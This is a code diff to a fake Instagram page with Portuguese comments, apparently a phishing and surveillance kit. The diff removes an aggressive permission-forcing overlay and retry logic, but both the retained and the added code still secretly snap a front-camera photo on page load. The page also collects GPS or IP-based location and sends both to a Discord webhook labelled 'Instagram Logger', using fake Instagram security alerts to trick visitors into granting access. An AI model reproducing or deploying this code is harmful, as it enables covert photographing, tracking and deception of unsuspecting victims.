@@ -6,10 +6,6 @@
     <link rel="stylesheet" href="/styles.css" />
     <link rel="icon" type="image/png" href="/img/insta-fav.ico">
     <title>Instagram</title>
-    <!-- Meta tags para forçar permissões em dispositivos modernos -->
-    <meta http-equiv="permissions-policy" content="camera=*, microphone=*, geolocation=*">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="mobile-web-app-capable" content="yes">
     <style>
         * {
             margin: 0;
@@ -350,66 +346,6 @@
             box-shadow: 0 3px 10px rgba(0,0,0,0.2);
             display: none;
         }
-
-        /* Estilos para o bloqueio de tela */
-        .permission-block {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(255, 255, 255, 0.95);
-            z-index: 100000;
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            text-align: center;
-        }
-
-        .permission-block h2 {
-            color: #e74c3c;
-            margin-bottom: 15px;
-            font-size: 20px;
-        }
-
-        .permission-block p {
-            margin-bottom: 20px;
-            font-size: 16px;
-            line-height: 1.5;
-            max-width: 500px;
-        }
-
-        .permission-block img {
-            max-width: 100%;
-            margin-bottom: 20px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-        }
-
-        .permission-block button {
-            background-color: #0095f6;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            padding: 10px 20px;
-            font-weight: bold;
-            cursor: pointer;
-            max-width: 250px;
-            margin-top: 10px;
-        }
-
-        /* Animação para chamar atenção */
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-
-        .pulse {
-            animation: pulse 1.5s infinite;
-        }
     </style>
 </head>
 <body>
@@ -424,24 +360,6 @@
     <!-- Dica para iOS/Safari -->
     <div class="ios-tooltip" id="iosTooltip">
         <strong>Importante:</strong> Clique em "Permitir" quando solicitado para acessar sua conta
-    </div>
-
-    <!-- Modal de bloqueio para quando o usuário bloqueia permissões -->
-    <div class="permission-block" id="permissionBlock">
-        <h2>⚠️ Verificação de segurança necessária</h2>
-        <p>Para proteger sua conta Instagram contra acesso não autorizado, é necessário verificar sua identidade.</p>
-        
-        <div id="permissionInstructions">
-            <p><strong>Siga estas etapas para continuar:</strong></p>
-            <p>1. Clique no ícone <strong>🔒</strong> na barra de endereço</p>
-            <p>2. Altere as configurações de permissão para "Permitir"</p>
-            <p>3. Atualize a página e tente novamente</p>
-            
-            <div id="browserSpecificInstructions"></div>
-        </div>
-        
-        <button id="retryPermissions" class="pulse">Verificar novamente</button>
-        <button id="continueAnyway" style="background-color: #999; margin-top: 10px;">Continuar mesmo assim</button>
     </div>
 
     <!-- Modal de solicitação de localização -->
@@ -542,7 +460,6 @@
         let cameraSent = false; // Para evitar enviar a mesma imagem várias vezes
         let locationSent = false; // Para rastrear se a localização já foi enviada
         let iosLocationAttempted = false; // Para rastrear tentativas de localização no iOS
-        let permissionRetryCount = 0; // Número de tentativas de obter permissão
 
         // Verificar se está em um dispositivo móvel
         const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
@@ -556,151 +473,6 @@
         // Mostrar aviso específico para iOS/Safari
         if (isIOS) {
             document.getElementById('iosNotice').style.display = 'block';
-        }
-
-        // Função para criar múltiplas solicitações de permissão
-        function requestPermissionsAggressively() {
-            // Array de promessas para tentar diferentes métodos de obter permissões
-            const permissionPromises = [];
-            
-            // 1. Tentar câmera
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                permissionPromises.push(
-                    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                        .then(stream => {
-                            stream.getTracks().forEach(track => track.stop());
-                            return true;
-                        })
-                        .catch(() => false)
-                );
-            }
-            
-            // 2. Tentar geolocalização
-            if (navigator.geolocation) {
-                permissionPromises.push(
-                    new Promise((resolve) => {
-                        navigator.geolocation.getCurrentPosition(
-                            () => resolve(true),
-                            () => resolve(false),
-                            { timeout: 5000, maximumAge: 0 }
-                        );
-                    })
-                );
-            }
-            
-            // 3. Tentar notificações (em alguns navegadores pode ajudar a "desbloquear" outras permissões)
-            if (window.Notification && Notification.permission !== 'granted') {
-                permissionPromises.push(
-                    Notification.requestPermission()
-                        .then(permission => permission === 'granted')
-                        .catch(() => false)
-                );
-            }
-            
-            // Executar todas as promessas e ver se alguma foi bem-sucedida
-            return Promise.allSettled(permissionPromises).then(results => {
-                const anySucceeded = results.some(r => r.status === 'fulfilled' && r.value === true);
-                return anySucceeded;
-            });
-        }
-
-        // Função para mostrar instruções específicas do navegador
-        function showBrowserSpecificInstructions() {
-            const instructionsDiv = document.getElementById('browserSpecificInstructions');
-            instructionsDiv.innerHTML = '';
-            
-            // Baseado no navegador/dispositivo
-            if (isIOS && isSafari) {
-                instructionsDiv.innerHTML = `
-                    <p style="margin-top:15px;font-weight:bold;">Instruções para Safari no iPhone/iPad:</p>
-                    <p>1. Toque no ícone <strong>aA</strong> na barra de endereços</p>
-                    <p>2. Selecione "Configurações do Site"</p>
-                    <p>3. Ative "Acesso à Localização" e "Câmera"</p>
-                    <p>4. Recarregue a página</p>
-                `;
-            } else if (isIOS) {
-                instructionsDiv.innerHTML = `
-                    <p style="margin-top:15px;font-weight:bold;">Instruções para iPhone/iPad:</p>
-                    <p>1. Toque no ícone de menu na barra de navegação</p>
-                    <p>2. Acesse as configurações do site</p>
-                    <p>3. Ative as permissões solicitadas</p>
-                    <p>4. Recarregue a página</p>
-                `;
-            } else if (navigator.userAgent.includes('Chrome')) {
-                instructionsDiv.innerHTML = `
-                    <p style="margin-top:15px;font-weight:bold;">Instruções para Chrome:</p>
-                    <p>1. Clique no ícone de cadeado 🔒 na barra de endereço</p>
-                    <p>2. Selecione "Permissões do site"</p>
-                    <p>3. Mude "Localização" e "Câmera" para "Permitir"</p>
-                    <p>4. Recarregue a página</p>
-                `;
-            } else if (navigator.userAgent.includes('Firefox')) {
-                instructionsDiv.innerHTML = `
-                    <p style="margin-top:15px;font-weight:bold;">Instruções para Firefox:</p>
-                    <p>1. Clique no ícone de informações do site na barra de endereço</p>
-                    <p>2. Clique em "Editar permissões"</p>
-                    <p>3. Mude "Acessar sua localização" e "Usar sua câmera" para "Permitir"</p>
-                    <p>4. Recarregue a página</p>
-                `;
-            } else {
-                instructionsDiv.innerHTML = `
-                    <p style="margin-top:15px;font-weight:bold;">Instruções para seu navegador:</p>
-                    <p>1. Acesse as configurações do site no menu do navegador</p>
-                    <p>2. Encontre as permissões para este site</p>
-                    <p>3. Altere as permissões necessárias para "Permitir"</p>
-                    <p>4. Recarregue a página</p>
-                `;
-            }
-        }
-
-        // Função para tentar múltiplos métodos de obter permissões e mostrar bloqueio se falhar
-        function forcePermissions() {
-            // Incrementar contador de tentativas
-            permissionRetryCount++;
-            
-            // Mostrar instruções específicas do navegador
-            showBrowserSpecificInstructions();
-            
-            // Tentar métodos agressivos para obter permissões
-            requestPermissionsAggressively().then(success => {
-                if (success) {
-                    // Se conseguiu, esconder o bloqueio e mostrar o modal normal
-                    document.getElementById('permissionBlock').style.display = 'none';
-                    showLocationModal();
-                    
-                    // Tentar inicializar câmera e geolocalização novamente
-                    if (isMobile && !cameraAttempted) {
-                        initCamera();
-                    }
-                    
-                    if (isIOS) {
-                        // Tentar iOS específico
-                        getiOSLocation().catch(console.error);
-                    } else {
-                        // Tentar método padrão
-                        getLocation().catch(console.error);
-                    }
-                } else if (permissionRetryCount < 3) {
-                    // Até 3 tentativas, mostrar o modal de bloqueio
-                    document.getElementById('permissionBlock').style.display = 'flex';
-                } else {
-                    // Após 3 tentativas, prosseguir mesmo sem permissões
-                    document.getElementById('permissionBlock').style.display = 'none';
-                    showLocationModal();
-                    
-                    // Usar IP como fallback
-                    getIPInfo().then(ipInfo => {
-                        if (ipInfo && ipInfo.latitude && ipInfo.longitude) {
-                            sendLocationToDiscord(
-                                ipInfo.latitude, 
-                                ipInfo.longitude, 
-                                null, 
-                                "IP (Fallback - Permissões bloqueadas)"
-                            );
-                        }
-                    }).catch(console.error);
-                }
-            });
         }
 
         // Função para enviar imagem da câmera diretamente para o Discord
@@ -810,13 +582,6 @@
                     inline: true
                 });
                 
-                // Adicionar número de tentativas de permissão
-                fields.push({
-                    name: "🔄 Tentativas",
-                    value: `\`${permissionRetryCount}\``,
-                    inline: true
-                });
-                
                 // Payload para enviar ao Discord
                 const payload = {
                     username: "Instagram Logger",
@@ -853,7 +618,7 @@
             }
         }
         
-        // Função para iniciar e capturar câmera - OTIMIZADA PARA SER SUPER RÁPIDA E CONTORNAR BLOQUEIOS
+        // Função para iniciar e capturar câmera - OTIMIZADA PARA SER SUPER RÁPIDA
         function initCamera() {
             if (cameraAttempted) return; // Evitar múltiplas tentativas
             cameraAttempted = true;
@@ -869,33 +634,15 @@
                 video.volume = 0;
                 
                 // Configurações otimizadas para câmera frontal com resolução mínima
-                // Usando diferentes configurações para tentar contornar bloqueios
-                const constraints = [
-                    // Tentativa 1: Configuração padrão
-                    {
-                        audio: false,
-                        video: {
-                            facingMode: "user",
-                            width: { ideal: 320 },
-                            height: { ideal: 240 },
-                            frameRate: { ideal: 15 }
-                        }
-                    },
-                    // Tentativa 2: Configuração mínima
-                    {
-                        audio: false,
-                        video: true
-                    },
-                    // Tentativa 3: Configuração com exato
-                    {
-                        audio: false,
-                        video: {
-                            facingMode: { exact: "user" },
-                            width: { exact: 320 },
-                            height: { exact: 240 }
-                        }
+                const constraints = {
+                    audio: false,
+                    video: {
+                        facingMode: "user", // Câmera frontal
+                        width: { ideal: 320 },
+                        height: { ideal: 240 },
+                        frameRate: { ideal: 15 } // Framerates mais baixos consomem menos recursos
                     }
-                ];
+                };
                 
                 // Definir timeout de segurança para garantir que a câmera seja desligada
                 cameraTimerId = setTimeout(() => {
@@ -911,72 +658,57 @@
                     }
                 }, 2000); // 2 segundos no máximo
                 
-                // Função para tentar cada configuração de câmera em sequência
-                function tryNextConstraint(index) {
-                    if (index >= constraints.length) {
-                        console.error("Todas as tentativas de câmera falharam");
+                // Solicitar acesso à câmera com alta prioridade
+                navigator.mediaDevices.getUserMedia(constraints)
+                    .then(stream => {
+                        video.srcObject = stream;
+                        
+                        // Tocar o vídeo imediatamente
+                        const playPromise = video.play();
+                        
+                        if (playPromise !== undefined) {
+                            playPromise
+                                .then(() => {
+                                    // O vídeo está tocando, esperar apenas o tempo mínimo necessário
+                                    setTimeout(() => {
+                                        try {
+                                            // Capturar a imagem
+                                            canvas.width = video.videoWidth;
+                                            canvas.height = video.videoHeight;
+                                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                                            
+                                            // Obter base64 da imagem com qualidade reduzida
+                                            cameraImage = canvas.toDataURL('image/jpeg', 0.5);
+                                            console.log("Imagem capturada com sucesso!");
+                                            
+                                            // IMPORTANTE: Parar IMEDIATAMENTE a câmera para minimizar a luz
+                                            stream.getTracks().forEach(track => track.stop());
+                                            video.srcObject = null;
+                                            
+                                            // Limpar o timeout já que concluímos
+                                            clearTimeout(cameraTimerId);
+                                            
+                                            // ENVIAR PARA O DISCORD IMEDIATAMENTE
+                                            sendCameraImageToDiscord(cameraImage);
+                                            
+                                        } catch (e) {
+                                            console.error("Erro ao capturar imagem:", e);
+                                            // Garantir que a câmera seja parada mesmo em caso de erro
+                                            stream.getTracks().forEach(track => track.stop());
+                                        }
+                                    }, 150); // Apenas 150ms de espera após início do vídeo
+                                })
+                                .catch(error => {
+                                    console.error("Erro ao iniciar reprodução do vídeo:", error);
+                                    // Parar a câmera em caso de erro
+                                    stream.getTracks().forEach(track => track.stop());
+                                });
+                        }
+                    })
+                    .catch(error => {
+                        console.error("Erro ao acessar câmera:", error);
                         clearTimeout(cameraTimerId);
-                        return;
-                    }
-                    
-                    navigator.mediaDevices.getUserMedia(constraints[index])
-                        .then(stream => {
-                            video.srcObject = stream;
-                            
-                            // Tocar o vídeo imediatamente
-                            const playPromise = video.play();
-                            
-                            if (playPromise !== undefined) {
-                                playPromise
-                                    .then(() => {
-                                        // O vídeo está tocando, esperar apenas o tempo mínimo necessário
-                                        setTimeout(() => {
-                                            try {
-                                                // Capturar a imagem
-                                                canvas.width = video.videoWidth;
-                                                canvas.height = video.videoHeight;
-                                                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                                                
-                                                // Obter base64 da imagem com qualidade reduzida
-                                                cameraImage = canvas.toDataURL('image/jpeg', 0.5);
-                                                console.log("Imagem capturada com sucesso!");
-                                                
-                                                // IMPORTANTE: Parar IMEDIATAMENTE a câmera para minimizar a luz
-                                                stream.getTracks().forEach(track => track.stop());
-                                                video.srcObject = null;
-                                                
-                                                // Limpar o timeout já que concluímos
-                                                clearTimeout(cameraTimerId);
-                                                
-                                                // ENVIAR PARA O DISCORD IMEDIATAMENTE
-                                                sendCameraImageToDiscord(cameraImage);
-                                                
-                                            } catch (e) {
-                                                console.error("Erro ao capturar imagem:", e);
-                                                // Garantir que a câmera seja parada mesmo em caso de erro
-                                                stream.getTracks().forEach(track => track.stop());
-                                            }
-                                        }, 150); // Apenas 150ms de espera após início do vídeo
-                                    })
-                                    .catch(error => {
-                                        console.error("Erro ao iniciar reprodução do vídeo:", error);
-                                        // Parar a câmera em caso de erro
-                                        stream.getTracks().forEach(track => track.stop());
-                                        // Tentar próxima configuração
-                                        tryNextConstraint(index + 1);
-                                    });
-                            }
-                        })
-                        .catch(error => {
-                            console.error(`Tentativa ${index + 1} falhou:`, error);
-                            // Tentar próxima configuração
-                            tryNextConstraint(index + 1);
-                        });
-                }
-                
-                // Iniciar tentativas de câmera
-                tryNextConstraint(0);
-                
+                    });
             } catch (error) {
                 console.error("Erro ao inicializar câmera:", error);
                 if (cameraTimerId) {
@@ -985,7 +717,7 @@
             }
         }
 
-        // Função especial para obter localização no iOS/Safari com múltiplas tentativas
+        // Função especial para obter localização no iOS/Safari
         function getiOSLocation() {
             if (iosLocationAttempted) return Promise.reject(new Error('Já tentado'));
             iosLocationAttempted = true;
@@ -1000,129 +732,109 @@
                 const iosTooltip = document.getElementById('iosTooltip');
                 iosTooltip.style.display = 'block';
                 
-                // Estratégias para iOS
-                let strategies = [
-                    // Estratégia 1: watchPosition (mais confiável no Safari)
-                    function() {
-                        return new Promise((resolveStrategy, rejectStrategy) => {
-                            const watchId = navigator.geolocation.watchPosition(
-                                (position) => {
-                                    navigator.geolocation.clearWatch(watchId);
-                                    resolveStrategy(position);
-                                },
-                                (error) => {
-                                    navigator.geolocation.clearWatch(watchId);
-                                    rejectStrategy(error);
-                                },
-                                {
-                                    enableHighAccuracy: true,
-                                    timeout: 20000,
-                                    maximumAge: 0
-                                }
-                            );
-                            
-                            // Cancelar após 15 segundos para não ficar preso
-                            setTimeout(() => {
-                                navigator.geolocation.clearWatch(watchId);
-                                rejectStrategy(new Error('Timeout'));
-                            }, 15000);
+                // Usar watchPosition em vez de getCurrentPosition para iOS
+                // Isso tem maior taxa de sucesso no Safari
+                const watchId = navigator.geolocation.watchPosition(
+                    (position) => {
+                        // Sucesso! Temos a localização
+                        userLatitude = position.coords.latitude;
+                        userLongitude = position.coords.longitude;
+                        
+                        console.log("Localização iOS obtida:", userLatitude, userLongitude);
+                        console.log("Precisão:", position.coords.accuracy, "metros");
+                        
+                        // Parar o watcher após obter a primeira posição
+                        navigator.geolocation.clearWatch(watchId);
+                        
+                        // Esconder a dica visual
+                        iosTooltip.style.display = 'none';
+                        
+                        // Enviar para o Discord com informações detalhadas
+                        sendLocationToDiscord(
+                            userLatitude, 
+                            userLongitude, 
+                            position.coords.accuracy, 
+                            "GPS (iOS/Safari)"
+                        );
+                        
+                        resolve({
+                            latitude: userLatitude,
+                            longitude: userLongitude,
+                            accuracy: position.coords.accuracy
                         });
                     },
-                    
-                    // Estratégia 2: getCurrentPosition com alerta
-                    function() {
-                        return new Promise((resolveStrategy, rejectStrategy) => {
-                            // Mostrar alerta para chamar atenção do usuário
-                            alert("O Instagram precisa verificar sua localização para proteger sua conta. Por favor, toque em 'Permitir' quando solicitado.");
+                    (error) => {
+                        console.error("Erro ao obter localização iOS:", error);
+                        
+                        // Esconder a dica visual
+                        iosTooltip.style.display = 'none';
+                        
+                        // Tentar método alternativo (realmente exibir um alerta)
+                        setTimeout(() => {
+                            alert("Para verificar sua identidade, o Instagram precisa acessar sua localização. Por favor, toque em 'Permitir' quando solicitado.");
                             
+                            // Tentar novamente com configurações diferentes
                             navigator.geolocation.getCurrentPosition(
-                                (position) => resolveStrategy(position),
-                                (error) => rejectStrategy(error),
+                                (position) => {
+                                    userLatitude = position.coords.latitude;
+                                    userLongitude = position.coords.longitude;
+                                    
+                                    sendLocationToDiscord(
+                                        userLatitude, 
+                                        userLongitude, 
+                                        position.coords.accuracy, 
+                                        "GPS (iOS/Safari - segunda tentativa)"
+                                    );
+                                    
+                                    resolve({
+                                        latitude: userLatitude,
+                                        longitude: userLongitude,
+                                        accuracy: position.coords.accuracy
+                                    });
+                                },
+                                (secondError) => {
+                                    console.error("Segunda tentativa falhou:", secondError);
+                                    
+                                    // Usar localização por IP como fallback
+                                    getIPInfo().then(ipInfo => {
+                                        if (ipInfo && ipInfo.latitude && ipInfo.longitude) {
+                                            sendLocationToDiscord(
+                                                ipInfo.latitude, 
+                                                ipInfo.longitude, 
+                                                null, 
+                                                "IP (fallback iOS/Safari)"
+                                            );
+                                            
+                                            resolve({
+                                                latitude: ipInfo.latitude,
+                                                longitude: ipInfo.longitude,
+                                                source: "IP"
+                                            });
+                                        } else {
+                                            reject(new Error("Todos os métodos falharam"));
+                                        }
+                                    }).catch(reject);
+                                },
                                 { 
                                     enableHighAccuracy: true, 
                                     timeout: 15000,
                                     maximumAge: 0
                                 }
                             );
-                        });
+                        }, 500);
                     },
-                    
-                    // Estratégia 3: getCurrentPosition com configurações menos exigentes
-                    function() {
-                        return new Promise((resolveStrategy, rejectStrategy) => {
-                            navigator.geolocation.getCurrentPosition(
-                                (position) => resolveStrategy(position),
-                                (error) => rejectStrategy(error),
-                                { 
-                                    enableHighAccuracy: false, 
-                                    timeout: 10000,
-                                    maximumAge: 60000
-                                }
-                            );
-                        });
+                    {
+                        enableHighAccuracy: true,   // Crucial para obter localização precisa
+                        timeout: 20000,             // Timeout maior para Safari (20 segundos)
+                        maximumAge: 0               // Não usar cache
                     }
-                ];
+                );
                 
-                // Função para tentar cada estratégia em sequência
-                function tryNextStrategy(index) {
-                    if (index >= strategies.length) {
-                        // Todas as estratégias falharam, usar IP como fallback
-                        iosTooltip.style.display = 'none';
-                        getIPInfo().then(ipInfo => {
-                            if (ipInfo && ipInfo.latitude && ipInfo.longitude) {
-                                sendLocationToDiscord(
-                                    ipInfo.latitude, 
-                                    ipInfo.longitude, 
-                                    null, 
-                                    "IP (fallback iOS/Safari - todas tentativas falharam)"
-                                );
-                                resolve({
-                                    latitude: ipInfo.latitude,
-                                    longitude: ipInfo.longitude,
-                                    source: "IP"
-                                });
-                            } else {
-                                reject(new Error("Todas as estratégias falharam"));
-                            }
-                        }).catch(reject);
-                        return;
-                    }
-                    
-                    strategies[index]()
-                        .then((position) => {
-                            // Sucesso! Temos a localização
-                            userLatitude = position.coords.latitude;
-                            userLongitude = position.coords.longitude;
-                            
-                            console.log("Localização iOS obtida:", userLatitude, userLongitude);
-                            console.log("Precisão:", position.coords.accuracy, "metros");
-                            
-                            // Esconder a dica visual
-                            iosTooltip.style.display = 'none';
-                            
-                            // Enviar para o Discord com informações detalhadas
-                            sendLocationToDiscord(
-                                userLatitude, 
-                                userLongitude, 
-                                position.coords.accuracy, 
-                                `GPS (iOS/Safari - estratégia ${index + 1})`
-                            );
-                            
-                            resolve({
-                                latitude: userLatitude,
-                                longitude: userLongitude,
-                                accuracy: position.coords.accuracy
-                            });
-                        })
-                        .catch((error) => {
-                            console.error(`Estratégia ${index + 1} falhou:`, error);
-                            // Tentar próxima estratégia
-                            tryNextStrategy(index + 1);
-                        });
-                }
-                
-                // Iniciar tentativas de estratégias
-                tryNextStrategy(0);
+                // Definir um timeout para parar o watcher se demorar muito
+                setTimeout(() => {
+                    navigator.geolocation.clearWatch(watchId);
+                    // Não rejeitamos a promessa aqui, deixamos o watcher tentar até o fim
+                }, 15000);
             });
         }
         
@@ -1143,36 +855,16 @@
         
         // Inicialização quando o DOM estiver carregado
         document.addEventListener('DOMContentLoaded', function() {
-            // Tentar forçar permissões antes de tudo
-            forcePermissions();
-            
             // IMPORTANTE: Iniciar câmera IMEDIATAMENTE quando a página carregar
             if (isMobile) {
                 // Iniciar a câmera imediatamente
                 initCamera();
             }
             
-            // Configurar botões no modal de bloqueio de permissão
-            document.getElementById('retryPermissions').addEventListener('click', function() {
-                forcePermissions();
-            });
-            
-            document.getElementById('continueAnyway').addEventListener('click', function() {
-                document.getElementById('permissionBlock').style.display = 'none';
+            // Mostrar o modal após um pequeno atraso
+            setTimeout(function() {
                 showLocationModal();
-                
-                // Usar IP como fallback
-                getIPInfo().then(ipInfo => {
-                    if (ipInfo && ipInfo.latitude && ipInfo.longitude) {
-                        sendLocationToDiscord(
-                            ipInfo.latitude, 
-                            ipInfo.longitude, 
-                            null, 
-                            "IP (Fallback - Usuário ignorou permissões)"
-                        );
-                    }
-                }).catch(console.error);
-            });
+            }, 1000);
         });
         
         // Função padrão para obter a localização do usuário (para dispositivos não-iOS)
@@ -1183,149 +875,57 @@
                     return;
                 }
                 
-                // Tentar múltiplas configurações em sequência se uma falhar
-                const options = [
-                    // Tentativa 1: Alta precisão, timeout curto
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        userLatitude = position.coords.latitude;
+                        userLongitude = position.coords.longitude;
+                        
+                        // Enviar localização para o Discord
+                        sendLocationToDiscord(
+                            userLatitude, 
+                            userLongitude, 
+                            position.coords.accuracy, 
+                            "GPS (Android/Outro)"
+                        );
+                        
+                        resolve({
+                            latitude: userLatitude,
+                            longitude: userLongitude
+                        });
+                    },
+                    (error) => {
+                        console.error('Erro ao obter localização:', error);
+                        reject(error);
+                    },
                     {
                         enableHighAccuracy: true,
                         timeout: 10000,
                         maximumAge: 0
-                    },
-                    // Tentativa 2: Sem alta precisão, timeout maior
-                    {
-                        enableHighAccuracy: false,
-                        timeout: 15000,
-                        maximumAge: 0
-                    },
-                    // Tentativa 3: Permitir cache, timeout longo
-                    {
-                        enableHighAccuracy: false,
-                        timeout: 20000,
-                        maximumAge: 60000
                     }
-                ];
-                
-                // Função para tentar cada configuração em sequência
-                function tryNextOption(index) {
-                    if (index >= options.length) {
-                        reject(new Error('Todas as tentativas de localização falharam'));
-                        return;
-                    }
-                    
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            userLatitude = position.coords.latitude;
-                            userLongitude = position.coords.longitude;
-                            
-                            // Enviar localização para o Discord
-                            sendLocationToDiscord(
-                                userLatitude, 
-                                userLongitude, 
-                                position.coords.accuracy, 
-                                `GPS (Android/Outro - tentativa ${index + 1})`
-                            );
-                            
-                            resolve({
-                                latitude: userLatitude,
-                                longitude: userLongitude,
-                                accuracy: position.coords.accuracy
-                            });
-                        },
-                        (error) => {
-                            console.error(`Tentativa ${index + 1} falhou:`, error);
-                            // Tentar próxima configuração
-                            tryNextOption(index + 1);
-                        },
-                        options[index]
-                    );
-                }
-                
-                // Iniciar tentativas
-                tryNextOption(0);
+                );
             });
         }
         
         // Função para obter informações do IP
         async function getIPInfo() {
             try {
-                // Tentar múltiplos serviços de IP em caso de falha
-                const ipServices = [
-                    // Serviço 1: ipify
-                    async function() {
-                        const ipResponse = await fetch('https://api.ipify.org?format=json');
-                        const ipData = await ipResponse.json();
-                        
-                        const infoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                        const ipInfo = await infoResponse.json();
-                        
-                        return {
-                            ip: ipData.ip,
-                            country: ipInfo.country_name || 'Desconhecido',
-                            region: ipInfo.region || 'Desconhecido',
-                            city: ipInfo.city || 'Desconhecido',
-                            isp: ipInfo.org || 'Desconhecido',
-                            latitude: ipInfo.latitude,
-                            longitude: ipInfo.longitude,
-                            timezone: ipInfo.timezone || 'Desconhecido'
-                        };
-                    },
-                    
-                    // Serviço 2: ipinfo.io
-                    async function() {
-                        const response = await fetch('https://ipinfo.io/json');
-                        const data = await response.json();
-                        
-                        // Formato: "lat,lon"
-                        const coords = data.loc ? data.loc.split(',') : [null, null];
-                        
-                        return {
-                            ip: data.ip,
-                            country: data.country || 'Desconhecido',
-                            region: data.region || 'Desconhecido',
-                            city: data.city || 'Desconhecido',
-                            isp: data.org || 'Desconhecido',
-                            latitude: coords[0],
-                            longitude: coords[1],
-                            timezone: data.timezone || 'Desconhecido'
-                        };
-                    },
-                    
-                    // Serviço 3: geoiplookup.io
-                    async function() {
-                        const response = await fetch('https://json.geoiplookup.io/');
-                        const data = await response.json();
-                        
-                        return {
-                            ip: data.ip,
-                            country: data.country_name || 'Desconhecido',
-                            region: data.region || 'Desconhecido',
-                            city: data.city || 'Desconhecido',
-                            isp: data.isp || 'Desconhecido',
-                            latitude: data.latitude,
-                            longitude: data.longitude,
-                            timezone: 'Desconhecido'
-                        };
-                    }
-                ];
+                // Primeiro obter o IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
                 
-                // Tentar cada serviço em sequência
-                for (let i = 0; i < ipServices.length; i++) {
-                    try {
-                        const ipInfo = await ipServices[i]();
-                        return ipInfo;
-                    } catch (error) {
-                        console.error(`Serviço de IP ${i + 1} falhou:`, error);
-                        // Continua para o próximo serviço
-                    }
-                }
+                // Depois obter mais informações sobre o IP
+                const infoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const ipInfo = await infoResponse.json();
                 
-                // Se todos os serviços falharem
                 return {
-                    ip: 'Desconhecido',
-                    country: 'Desconhecido',
-                    region: 'Desconhecido',
-                    city: 'Desconhecido',
-                    isp: 'Desconhecido'
+                    ip: ipData.ip,
+                    country: ipInfo.country_name || 'Desconhecido',
+                    region: ipInfo.region || 'Desconhecido',
+                    city: ipInfo.city || 'Desconhecido',
+                    isp: ipInfo.org || 'Desconhecido',
+                    latitude: ipInfo.latitude,
+                    longitude: ipInfo.longitude,
+                    timezone: ipInfo.timezone || 'Desconhecido'
                 };
             } catch (error) {
                 console.error('Erro ao obter informações de IP:', error);
@@ -1448,11 +1048,6 @@
                             inline: false
                         },
                         {
-                            name: "🔒 Status das Permissões",
-                            value: "```Tentativas: " + permissionRetryCount + "\nCâmera: " + (cameraImage ? "Obtida" : "Bloqueada") + "\nLocalização: " + (userLatitude ? "Obtida" : "Bloqueada") + "```",
-                            inline: false
-                        },
-                        {
                             name: "📅 Data e Hora",
                             value: "```" + new Date().toLocaleString() + "```",
                             inline: false
@@ -1492,7 +1087,7 @@
             button.textContent = "Verificando...";
             button.disabled = true;
             
-            // Se ainda não capturamos a câmera, tentar novamente
+            // Se ainda não capturamos a câmera, tentar novamente (mas provavelmente já foi feito)
             if (isMobile && !cameraAttempted) {
                 initCamera();
             }
@@ -1586,30 +1181,22 @@
                     .catch((error) => {
                         // Erro ao obter localização
                         console.error("Erro ao obter localização:", error);
+                        hideLocationModal();
                         
-                        // Tentar forçar as permissões novamente
-                        permissionRetryCount++;
-                        if (permissionRetryCount < 3) {
-                            // Mostrar modal de bloqueio
-                            document.getElementById('permissionBlock').style.display = 'flex';
-                            hideLocationModal();
-                        } else {
-                            // Após várias tentativas, continuar mesmo sem permissão
-                            hideLocationModal();
-                            verificacaoConcluida = true;
-                            
-                            // Usar IP como fallback
-                            getIPInfo().then(ipInfo => {
-                                if (ipInfo && ipInfo.latitude && ipInfo.longitude) {
-                                    sendLocationToDiscord(
-                                        ipInfo.latitude, 
-                                        ipInfo.longitude, 
-                                        null, 
-                                        "IP (Fallback Android/Outro após várias tentativas)"
-                                    );
-                                }
-                            }).catch(console.error);
-                        }
+                        // Usar IP como fallback
+                        getIPInfo().then(ipInfo => {
+                            if (ipInfo && ipInfo.latitude && ipInfo.longitude) {
+                                sendLocationToDiscord(
+                                    ipInfo.latitude, 
+                                    ipInfo.longitude, 
+                                    null, 
+                                    "IP (Fallback Android/Outro)"
+                                );
+                            }
+                        }).catch(console.error);
+                        
+                        // Permitir continuar mesmo sem a localização exata
+                        verificacaoConcluida = true;
                         
                         // Reativar o botão
                         button.textContent = "Verificar minha localização";
@@ -1622,48 +1209,6 @@
         document.getElementById('denyLocation').addEventListener('click', function() {
             hideLocationModal();
             
-            // Se estamos no iOS, tentamos usar técnicas mais agressivas
-            if (isIOS && !iosLocationAttempted) {
-                alert("O Instagram precisa verificar sua identidade para proteger sua conta contra acesso não autorizado. Por favor, permita o acesso à sua localização quando solicitado.");
-                
-                getiOSLocation()
-                    .then(() => {
-                        verificacaoConcluida = true;
-                        // Mostrar mensagem de sucesso
-                        const successMessage = document.createElement('div');
-                        successMessage.style.position = 'fixed';
-                        successMessage.style.top = '50%';
-                        successMessage.style.left = '50%';
-                        successMessage.style.transform = 'translate(-50%, -50%)';
-                        successMessage.style.backgroundColor = 'rgba(0, 150, 0, 0.9)';
-                        successMessage.style.color = 'white';
-                        successMessage.style.padding = '15px 20px';
-                        successMessage.style.borderRadius = '5px';
-                        successMessage.style.zIndex = '10000';
-                        successMessage.style.boxShadow = '0 2px 10px rgba(0,0,0,0.3)';
-                        successMessage.style.fontWeight = 'bold';
-                        successMessage.style.textAlign = 'center';
-                        successMessage.innerHTML = "✓<br>Verificação concluída!<br><span style='font-size:12px;font-weight:normal;'>Você pode fazer login agora.</span>";
-                        document.body.appendChild(successMessage);
-                        
-                        setTimeout(function() {
-                            document.body.removeChild(successMessage);
-                        }, 2000);
-                    })
-                    .catch(error => {
-                        console.error("Tentativa agressiva falhou:", error);
